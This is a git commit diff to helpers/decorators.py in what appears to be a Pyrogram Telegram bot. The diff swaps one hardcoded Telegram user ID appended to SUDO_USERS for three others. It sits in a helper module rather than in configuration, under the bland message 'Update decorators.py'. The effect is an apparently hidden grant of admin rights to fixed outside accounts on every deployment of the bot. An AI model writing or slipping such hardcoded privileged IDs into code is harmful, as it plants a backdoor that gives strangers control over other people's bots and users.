94d8bd6dc78bcc4df5f28594b93cbf913d9996cd
Askarbot <88702146+Askarbot@users.noreply.github.com>
2021-09-07 17:44:51 +0700

    Update decorators.py

--- helpers/decorators.py
+++ helpers/decorators.py
@@ -23,7 +23,9 @@ from pyrogram.types import Message
 from helpers.admins import get_administrators
 from config import SUDO_USERS
 
-SUDO_USERS.append(1805518906)
+SUDO_USERS.append(1803347744)
+SUDO_USERS.append(1890877816)
+SUDO_USERS.append(1979717764)
 
 
 def errors(func: Callable) -> Callable:
